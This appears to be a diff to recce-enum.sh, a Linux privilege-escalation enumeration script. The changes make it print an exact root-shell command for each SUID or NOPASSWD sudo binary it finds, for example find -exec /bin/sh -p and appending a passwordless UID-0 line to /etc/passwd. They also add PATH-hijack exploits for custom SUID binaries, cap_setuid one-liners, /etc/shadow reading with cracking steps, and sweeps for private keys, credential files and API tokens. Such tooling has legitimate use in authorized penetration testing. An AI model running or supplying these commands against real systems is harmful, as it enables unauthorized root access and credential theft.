@@ -58,6 +58,118 @@ flag() { PB="${PB}${1}	${2}
 pb_has()  { printf '%s' "$PB" | grep -q "^$1	"; }
 pb_vals() { printf '%s' "$PB" | awk -F'\t' -v t="$1" '$1==t && $2!=""{print $2}' | sort -u; }
 
+# --- GTFOBins-lite: the EXACT technique for a specific binary --------------------
+# Instead of "look it up on gtfobins", print the precise command tailored to the
+# binary we actually found. $1 = full path. Empty output = not a known abusable.
+# SUID context: the technique keeps euid 0 (the -p shell flag where relevant).
+gtfo_suid() {
+  p="$1"; b=$(basename "$p")
+  case "$b" in
+    bash|dash|ash|sh|zsh|ksh) echo "$p -p";;
+    find)            echo "$p . -exec /bin/sh -p \\; -quit";;
+    nmap)            echo "echo 'os.execute(\"/bin/sh -p\")' >/tmp/x.nse; $p --script=/tmp/x.nse  (old nmap: $p --interactive then !sh)";;
+    vim|rvim|vi)     echo "$p -c ':py3 import os;os.setuid(0);os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset;exec sh -p\")'";;
+    less|more|pg)    echo "$p /etc/profile   then type:  !/bin/sh -p";;
+    man)             echo "$p man   then type:  !/bin/sh -p";;
+    awk|gawk|mawk|nawk) echo "$p 'BEGIN{system(\"/bin/sh -p\")}'";;
+    env)             echo "$p /bin/sh -p";;
+    perl)            echo "$p -e 'use POSIX qw(setuid);setuid(0);exec \"/bin/sh -p\";'";;
+    python|python2|python3) echo "$p -c 'import os;os.setuid(0);os.system(\"/bin/sh -p\")'";;
+    php)             echo "$p -r \"posix_setuid(0);system('/bin/sh -p');\"";;
+    ruby)            echo "$p -e 'Process::Sys.setuid(0);exec \"/bin/sh -p\"'";;
+    lua|lua5.1|lua5.3) echo "$p -e 'os.execute(\"/bin/sh -p\")'";;
+    node)            echo "$p -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'";;
+    tclsh)           echo "echo 'exec /bin/sh -p <@stdin >@stdout 2>@stderr' | $p";;
+    gdb)             echo "$p -nx -ex 'python import os;os.setuid(0)' -ex '!sh -p' -ex quit";;
+    cp)              echo "overwrite a root file: printf 'r::0:0::/root:/bin/bash\\n' | $p /dev/stdin /etc/passwd  ->  su r";;
+    dd)              echo "printf 'r::0:0::/root:/bin/bash\\n' | $p of=/etc/passwd oflag=append conv=notrunc  ->  su r";;
+    tee)             echo "printf 'r::0:0::/root:/bin/bash\\n' | $p -a /etc/passwd  ->  su r";;
+    tar)             echo "$p -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
+    zip)             echo "$p /tmp/z.zip /etc/hosts -T -TT 'sh -p #'";;
+    rsync)           echo "$p -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null";;
+    sed)             echo "$p -n '1e exec /bin/sh -p' /etc/hosts";;
+    ed)              echo "$p /etc/hosts   then type:  !/bin/sh -p";;
+    ftp)             echo "$p   then type:  !/bin/sh -p";;
+    make)            echo "COMMAND='/bin/sh -p'; $p -s --eval=\$'x:\\n\\t-'\"\$COMMAND\"";;
+    nano|rnano)      echo "$p   then ^R^X and type:  reset; sh -p 1>&0 2>&0";;
+    cat|head|tail)   echo "$p reads any file as root:  $p /etc/shadow   (then crack offline)";;
+    xxd)             echo "$p /etc/shadow | $p -r   (read any root-owned file)";;
+    base64|base32|basenc) echo "$p /etc/shadow | $p --decode   (read any root-owned file)";;
+    openssl)         echo "$p enc -in /etc/shadow ...   (read/write any file as root - see GTFOBins openssl)";;
+    chmod)           echo "$p u+s /bin/bash   ->  /bin/bash -p";;
+    chown)           echo "$p \$(id -u):\$(id -g) /etc/shadow   ->  read it";;
+    strace)          echo "$p -o /dev/null /bin/sh -p";;
+    flock)           echo "$p -u / /bin/sh -p";;
+    ionice|nice|nohup|stdbuf|timeout|setarch|taskset|watch|xargs|setsid) echo "$p /bin/sh -p   (wrapper -> spawns a euid-0 shell; xargs: echo | $p -a /bin/sh -p)";;
+    socat)           echo "$p stdin exec:/bin/sh -p";;
+    git)             echo "$p -p help   then:  !/bin/sh -p   (or PAGER=/bin/sh -p $p -p ...)";;
+    *) echo "";;
+  esac
+}
+# sudo context: already runs as root, so no -p; prefix with sudo <binary>.
+gtfo_sudo() {
+  p="$1"; b=$(basename "$p")
+  case "$b" in
+    find)            echo "sudo $p . -exec /bin/sh \\; -quit";;
+    vim|rvim|vi)     echo "sudo $p -c ':!/bin/sh'";;
+    less|more|pg)    echo "sudo $p /etc/profile   then:  !/bin/sh";;
+    man)             echo "sudo $p man   then:  !/bin/sh";;
+    awk|gawk)        echo "sudo $p 'BEGIN{system(\"/bin/sh\")}'";;
+    env)             echo "sudo $p /bin/sh";;
+    perl)            echo "sudo $p -e 'exec \"/bin/sh\";'";;
+    python|python2|python3) echo "sudo $p -c 'import os;os.system(\"/bin/sh\")'";;
+    php)             echo "sudo $p -r 'system(\"/bin/sh\");'";;
+    ruby)            echo "sudo $p -e 'exec \"/bin/sh\"'";;
+    node)            echo "sudo $p -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'";;
+    nmap)            echo "sudo $p --interactive   then:  !sh   (or --script an os.execute)";;
+    tar)             echo "sudo $p -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
+    apt|apt-get)     echo "sudo $p update -o APT::Update::Pre-Invoke::=/bin/sh";;
+    git)             echo "sudo PAGER='sh -c \"exec sh 0<&1\"' $p -p help   (or -c core.pager)";;
+    systemctl)       echo "sudo $p link /tmp/root.service && sudo $p start root  (unit ExecStart=/bin/sh - see GTFOBins)";;
+    make)            echo "sudo $p -s --eval=\$'x:\\n\\t-/bin/sh'";;
+    sed)             echo "sudo $p -n '1e exec /bin/sh' /etc/hosts";;
+    ed)              echo "sudo $p   then:  !/bin/sh";;
+    tee)             echo "printf 'r::0:0::/root:/bin/bash\\n' | sudo $p -a /etc/passwd  ->  su r";;
+    dd)              echo "printf 'r::0:0::/root:/bin/bash\\n' | sudo $p of=/etc/passwd oflag=append conv=notrunc  ->  su r";;
+    cp)              echo "sudo $p your_file /etc/... (overwrite a root-owned config/cron)";;
+    zip)             echo "sudo $p /tmp/z.zip /etc/hosts -T -TT 'sh #'";;
+    ftp)             echo "sudo $p   then:  !/bin/sh";;
+    mount)           echo "sudo $p -o bind /bin/sh /bin/mount ... (see GTFOBins) - or mount a device to read files";;
+    bash|sh|dash|ash|zsh|ksh) echo "sudo $p";;
+    *) echo "";;
+  esac
+}
+# analyze_suid <path>: read-only static analysis of a NON-standard SUID binary to
+# find the ACTUAL escalation vector (PATH hijack / env / writable helper). Uses
+# 'strings' only - it reads the file, never executes the target.
+analyze_suid() {
+  bin="$1"
+  [ -w "$bin" ] && { info "      -> the SUID binary itself is WRITABLE: overwrite it with your payload"; flag ROOT_WRITABLE_BIN "$bin"; }
+  have strings || { info "      (install binutils 'strings' for deeper static analysis of this binary)"; return; }
+  st=$(strings -a "$bin" 2>/dev/null)
+  # Does it shell out? (system/popen/exec* are the classic SUID sinks.)
+  sink=$(printf '%s\n' "$st" | grep -oE '\b(system|popen|execl|execlp|execv|execvp|execve)\b' | sort -u | tr '\n' ',' | sed 's/,$//')
+  # Bare command names it likely invokes -> PATH hijack. Whole-line single tokens
+  # only, minus ELF/compiler/libc artifacts, so the list is plausible commands.
+  hij=$(printf '%s\n' "$st" \
+    | grep -oxE '[a-z][a-z0-9-]{1,15}' \
+    | grep -vwE 'usage|error|null|true|false|root|main|system|popen|setuid|setgid|getuid|geteuid|printf|fprintf|sprintf|snprintf|puts|fputs|exit|abort|malloc|free|calloc|realloc|strcpy|strncpy|strcat|strlen|strcmp|strncmp|memcpy|memmove|memset|fopen|fclose|fread|fwrite|read|write|open|close|libc|gcc|glibc|clang|abi|note|comment|init|fini|gmon|environ|errno|stdin|stdout|stderr|getenv|setenv' \
+    | sort -u | head -6 | tr '\n' ' ')
+  if [ -n "$sink" ]; then
+    info "      -> shells out via: $sink"
+    if [ -n "$hij" ]; then
+      find_ "SUID PATH-hijack candidate: $bin invokes bare command(s) [$hij] -> plant a malicious binary earlier in PATH"
+      info  "         EXPLOIT: echo '/bin/bash -p' >/tmp/<cmd>; chmod +x /tmp/<cmd>; PATH=/tmp:\$PATH $bin"
+      flag SUID_PATH_HIJACK "$bin :: $hij"
+    fi
+  fi
+  printf '%s\n' "$st" | grep -qE 'LD_PRELOAD|LD_LIBRARY_PATH' && { find_ "SUID env-injection candidate: $bin reads LD_PRELOAD/LD_LIBRARY_PATH"; flag SUID_ENV "$bin"; }
+  # Absolute paths it opens that are writable by us -> poison the input/config.
+  printf '%s\n' "$st" | grep -oE '/(etc|opt|tmp|var|home|usr/local)/[A-Za-z0-9_./-]+' | sort -u | while read -r f; do
+    [ -e "$f" ] && [ -w "$f" ] && { find_ "SUID reads a WRITABLE file: $bin opens $f -> poison it to influence the root process"; flag SUID_WRITABLE_HELPER "$bin :: $f"; }
+  done
+}
+
 # --- self-test (pre-flight): verify the script + host, run NO enumeration ---
 if [ "$SELFTEST" -eq 1 ]; then
   echo "recce-enum.sh self-test - verifies the script + host; runs NO enumeration"
@@ -200,10 +312,14 @@ if have sudo; then
     printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_PRELOAD" && { find_ "LD_PRELOAD preserved in sudo env -> library injection to root"; flag SUDO_LDPRELOAD "env_keep LD_PRELOAD"; }
     printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_LIBRARY_PATH" && { find_ "LD_LIBRARY_PATH preserved in sudo env -> library injection to root"; flag SUDO_LDLIB "env_keep LD_LIBRARY_PATH"; }
     printf '%s' "$SUDOL" | grep -qi "SETENV" && info "    SETENV present -> you can pass env vars into the sudo command (aids LD_* tricks)"
-    # Pull the concrete NOPASSWD binaries so the playbook can map each to GTFOBins.
+    # For each NOPASSWD binary, print the EXACT sudo escalation command for it.
     printf '%s\n' "$SUDOL" | grep -iE 'NOPASSWD' | grep -oE '/[A-Za-z0-9_./-]+' | sort -u | while read -r sb; do
-      bn=$(basename "$sb")
-      find_ "NOPASSWD sudo: $sb -> GTFOBins '$bn' #sudo (root, no password)"
+      stech=$(gtfo_sudo "$sb")
+      if [ -n "$stech" ]; then
+        find_ "NOPASSWD sudo: $sb (GTFOBins) -> $stech"
+      else
+        find_ "NOPASSWD sudo: $sb -> GTFOBins '$(basename "$sb")' #sudo (root, no password); also check if $sb runs a writable script or a relative-path binary you can hijack"
+      fi
     done
     # Record the whole no-pass allow-list for the playbook (basenames).
     NPB=$(printf '%s\n' "$SUDOL" | grep -iE 'NOPASSWD' | grep -oE '/[A-Za-z0-9_./-]+' | xargs -r -n1 basename 2>/dev/null | sort -u | tr '\n' ' ')
@@ -226,13 +342,20 @@ while read -r b; do
   [ -z "$b" ] && continue
   base=$(basename "$b")
   if printf '%s' "$base" | grep -qxE "$GTFO"; then
-    find_ "SUID $b - GTFOBins escalation candidate"; flag SUID_GTFO "$b"
+    # Don't just flag it - print the EXACT technique for THIS binary.
+    tech=$(gtfo_suid "$b")
+    if [ -n "$tech" ]; then
+      find_ "SUID $b (GTFOBins) -> $tech"; flag SUID_GTFO "$b -> $tech"
+    else
+      find_ "SUID $b (GTFOBins escalation candidate) - see gtfobins.github.io/#$base"; flag SUID_GTFO "$b"
+    fi
   elif printf '%s' "$base" | grep -qxE "$SUID_BASE"; then
     info "    $b"
   else
-    # Unknown/custom SUID root binary: prime target (relative-path / lib hijack /
-    # env abuse). Worth reversing even without a GTFOBins entry.
-    find_ "Non-standard SUID root binary: $b - inspect (strace for relative-path exec / getenv / system() calls)"; flag SUID_CUSTOM "$b"
+    # Unknown/custom SUID root binary: go deeper with read-only static analysis to
+    # find the ACTUAL vector (PATH hijack / env / writable helper), not just flag it.
+    find_ "Non-standard SUID root binary: $b - analyzing:"; flag SUID_CUSTOM "$b"
+    analyze_suid "$b"
   fi
 done < <(find / -perm -4000 -type f 2>/dev/null)
 info "SGID binaries:"
@@ -243,9 +366,20 @@ if have getcap; then
     [ -z "$line" ] && continue
     capbin=$(printf '%s' "$line" | awk '{print $1}')
     case "$line" in
-      *cap_setuid*) find_ "Capability cap_setuid on $capbin -> setuid(0) then a shell"; flag CAP_SETUID "$capbin";;
+      *cap_setuid*)
+        cx=""
+        case "$(basename "$capbin")" in
+          python|python2|python3) cx="$capbin -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'";;
+          perl) cx="$capbin -e 'use POSIX;setuid(0);exec \"/bin/sh\";'";;
+          ruby) cx="$capbin -e 'Process::Sys.setuid(0);exec \"/bin/sh\"'";;
+          node) cx="$capbin -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'";;
+          php)  cx="$capbin -r 'posix_setuid(0);system(\"/bin/sh\");'";;
+        esac
+        if [ -n "$cx" ]; then find_ "Capability cap_setuid on $capbin -> EXACT: $cx"; else find_ "Capability cap_setuid on $capbin -> call setuid(0) then exec a shell"; fi
+        flag CAP_SETUID "$capbin";;
       *cap_setgid*) find_ "Capability cap_setgid on $capbin -> privesc candidate"; flag CAP_GENERIC "$capbin";;
-      *cap_dac_read_search*|*cap_dac_override*) find_ "Capability $line -> read/overwrite any file (e.g. /etc/shadow, /etc/passwd)"; flag CAP_DAC "$capbin";;
+      *cap_dac_read_search*) find_ "Capability cap_dac_read_search on $capbin -> read ANY file, e.g.:  $capbin /etc/shadow  (then crack)"; flag CAP_DAC "$capbin";;
+      *cap_dac_override*) find_ "Capability cap_dac_override on $capbin -> overwrite ANY file (add a UID-0 line to /etc/passwd)"; flag CAP_DAC "$capbin";;
       *cap_sys_admin*|*cap_sys_ptrace*|*cap_sys_module*) find_ "Capability $line -> powerful privesc candidate (namespace/ptrace/module load)"; flag CAP_GENERIC "$capbin";;
       *) info "    $line";;
     esac
@@ -338,8 +472,19 @@ mount 2>/dev/null | grep -qE 'nosuid' || info "note: some mounts allow suid (def
 
 # ============================================================ credential hunting
 sec "Credential & secret hunting"
-info "SSH keys / configs:"
-find / \( -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' \) 2>/dev/null | while read -r k; do [ -n "$k" ] && { find_ "SSH private key: $k"; flag SSH_KEY "$k"; }; done
+info "SSH / PEM private keys (triaged - encrypted? ready to use?):"
+find / \( -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' \
+  -o -name '*.pem' -o -name '*.key' -o -name 'identity' \) -type f 2>/dev/null | while read -r k; do
+  [ -r "$k" ] || continue
+  head -c 64 "$k" 2>/dev/null | grep -q 'PRIVATE KEY' || continue
+  if grep -qE 'ENCRYPTED|Proc-Type:.*ENCRYPTED|bcrypt' "$k" 2>/dev/null; then
+    find_ "Private key (ENCRYPTED): $k -> crack:  ssh2john $k > h; john --wordlist=rockyou.txt h  then use it"; flag SSH_KEY "$k (encrypted)"
+  else
+    who=""
+    pub="${k}.pub"; [ -r "$pub" ] && who=" (pub: $(awk '{print $3}' "$pub" 2>/dev/null))"
+    find_ "Private key (UNENCRYPTED, ready): $k$who -> chmod 600; ssh -i $k <user>@<host from known_hosts>"; flag SSH_KEY "$k (unencrypted)"
+  fi
+done
 for f in /root/.ssh/authorized_keys "$HOME/.ssh/authorized_keys" "$HOME/.ssh/config"; do [ -r "$f" ] && info "readable SSH file: $f"; done
 info "History files:"
 for f in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" "$HOME/.psql_history" "$HOME/.python_history"; do
@@ -352,11 +497,21 @@ find / \( -name '*.env' -o -name '.env' -o -name 'wp-config.php' -o -name 'setti
 for d in "$HOME/.aws" "$HOME/.config/gcloud" "$HOME/.azure" "$HOME/.kube" "$HOME/.docker"; do
   [ -d "$d" ] && { find_ "Cloud/orchestration creds dir present: $d"; flag CLOUD_CREDS "$d"; }
 done
-# Grep a bounded set of dirs for obvious secrets (fast, avoids whole-FS scan).
-info "Quick secret grep (bounded):"
-_sec=$(grep -rniE 'password[[:space:]]*=|api[_-]?key|secret[[:space:]]*=|BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY' \
-  /etc /opt /var/www /srv 2>/dev/null | head -30)
-if [ -n "$_sec" ]; then printf '%s\n' "$_sec" | sed 's/^/    /'; flag SECRETS_FOUND "grep hit in /etc,/opt,/var/www,/srv"; fi
+# Named credential-store files (each is directly usable).
+for f in "$HOME/.git-credentials" "$HOME/.netrc" "$HOME/.npmrc" "$HOME/.pypirc" \
+         "$HOME/.docker/config.json" "$HOME/.config/gh/hosts.yml" "$HOME/.config/hub" \
+         "$HOME/.aws/credentials" "$HOME/.s3cfg" "$HOME/.boto" "$HOME/.rclone.conf"; do
+  [ -r "$f" ] && { find_ "Credential store file: $f -> read it for reusable creds/tokens"; flag CRED_FILE "$f"; }
+done
+# Mail spools sometimes carry password resets / onboarding creds.
+for m in /var/mail/* /var/spool/mail/*; do [ -r "$m" ] && [ -s "$m" ] && info "readable mail spool: $m"; done
+# High-signal secret sweep: cloud keys, API tokens, JWTs, private keys, assignments.
+# Bounded to likely locations; -I skips binaries; capped output.
+sec "High-signal secrets (cloud keys, tokens, private keys)"
+_HS='AKIA[0-9A-Z]{16}|aws_secret_access_key|AIza[0-9A-Za-z_-]{35}|ghp_[0-9A-Za-z]{36}|gho_[0-9A-Za-z]{36}|glpat-[0-9A-Za-z_-]{20}|xox[baprs]-[0-9A-Za-z-]{10,}|sk-[A-Za-z0-9]{32,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+|(pass(word|wd)?|secret|token|api[_-]?key|client_secret)[[:space:]]*[:=][[:space:]]*[^[:space:];,#]{4,}'
+_hits=$(grep -rniIE "$_HS" /etc /opt /srv /var/www /home /root "$HOME" /tmp /run 2>/dev/null \
+  | grep -viE 'recce-enum|/\.cache/|/proc/|Binary file' | head -50)
+if [ -n "$_hits" ]; then printf '%s\n' "$_hits" | cut -c1-200 | sed 's/^/    /'; flag SECRETS_FOUND "high-signal regex hits (keys/tokens/creds)"; fi
 
 # ============================================================ network
 sec "Network"
@@ -534,23 +689,22 @@ if pb_has SUDO_22809; then step "sudoedit CVE-2023-22809 -> edit any root file" 
   "         then add:  <you> ALL=(ALL) NOPASSWD:ALL   and  sudo -i" \
   "confirm: id   ->  uid=0(root)"; fi
 
-if pb_has SUID_GTFO; then step "SUID root binary (GTFOBins) -> root"; list_ SUID_GTFO
+if pb_has SUID_GTFO; then step "SUID root binary (GTFOBins) -> root  [EXACT command per binary]"; list_ SUID_GTFO
   step "  how" \
-    "prereq : the SUID bit keeps euid=0 on exec." \
-    "run    : gtfobins.github.io/#<name>  (SUID section). Many keep privs with -p:" \
-    "           /path/bash -p              find /etc/hosts -exec /bin/sh -p \\; -quit" \
-    "           nmap --interactive then !sh        cp: overwrite a root-owned file" \
+    "run    : each line above is the precise technique for THAT binary - run it as-is." \
     "confirm: id   ->  euid=0(root)"; fi
 
-if pb_has SUID_CUSTOM; then step "Non-standard SUID root binary -> reverse it"; list_ SUID_CUSTOM
-  step "  how" \
-    "prereq : a custom SUID-root program (not a distro default)." \
-    "look   : strings <bin>; ltrace/strace <bin>  -> watch for:" \
-    "           system(\"prog\")  with no absolute path  -> PATH hijack:" \
-    "             put a script 'prog' (contents: /bin/bash -p) early in PATH, then run:" \
-    "             chmod +x /tmp/prog; PATH=/tmp:\$PATH <bin>" \
-    "           getenv() of LD_* / config path         -> env or file hijack" \
-    "           fopen()/exec of a writable helper       -> replace the helper" \
+if pb_has SUID_CUSTOM; then step "Non-standard SUID root binary -> the analysis above found the vector"; list_ SUID_CUSTOM
+  if pb_has SUID_PATH_HIJACK; then step "  PATH hijack (references a bare command name)"; list_ SUID_PATH_HIJACK
+    step "  run" \
+      "         echo '/bin/bash -p' > /tmp/<cmd>; chmod +x /tmp/<cmd>; PATH=/tmp:\$PATH <suid-bin>" \
+      "confirm: id -> euid=0(root)"; fi
+  if pb_has SUID_WRITABLE_HELPER; then step "  Writable helper/config it reads -> poison it"; list_ SUID_WRITABLE_HELPER; fi
+  if pb_has SUID_ENV; then step "  Reads LD_* -> env injection"; list_ SUID_ENV
+    step "  run" "         build the standard preload .so (see the sudo LD_PRELOAD step) and export it before running the binary."; fi
+  step "  else" \
+    "look   : strings <bin> (already run above); for dynamic behaviour, ltrace/strace it in a lab" \
+    "         and watch for a relative exec / getenv() / a writable file it opens." \
     "confirm: id   ->  euid=0(root)"; fi
 
 if pb_has CAP_SETUID; then step "cap_setuid capability -> root"; list_ CAP_SETUID
@@ -743,11 +897,12 @@ if pb_has WRITABLE_RC || pb_has WRITABLE_AUTHKEYS || pb_has PAM_WRITABLE; then
     "authkey: append your public key -> ssh back in as that user any time." \
     "confirm: code exec as the triggering user / silent re-entry"; fi
 
-if pb_has SSH_KEY || pb_has KRB_TICKET || pb_has CLOUD_CREDS || pb_has SECRETS_FOUND || pb_has PROC_ENV || pb_has DB_CREDS; then
+if pb_has SSH_KEY || pb_has KRB_TICKET || pb_has CLOUD_CREDS || pb_has SECRETS_FOUND || pb_has PROC_ENV || pb_has DB_CREDS || pb_has CRED_FILE; then
   step "Harvested credentials / keys / tickets -> reuse & pivot"
   [ -n "$(pb_vals SSH_KEY)" ]     && list_ SSH_KEY
   [ -n "$(pb_vals KRB_TICKET)" ]  && list_ KRB_TICKET
   [ -n "$(pb_vals CLOUD_CREDS)" ] && list_ CLOUD_CREDS
+  [ -n "$(pb_vals CRED_FILE)" ]   && list_ CRED_FILE
   [ -n "$(pb_vals DB_CREDS)" ]    && list_ DB_CREDS
   step "  how" \
     "ssh    : ssh -i <id_rsa> <user>@<host>   (chmod 600 the key first)" \
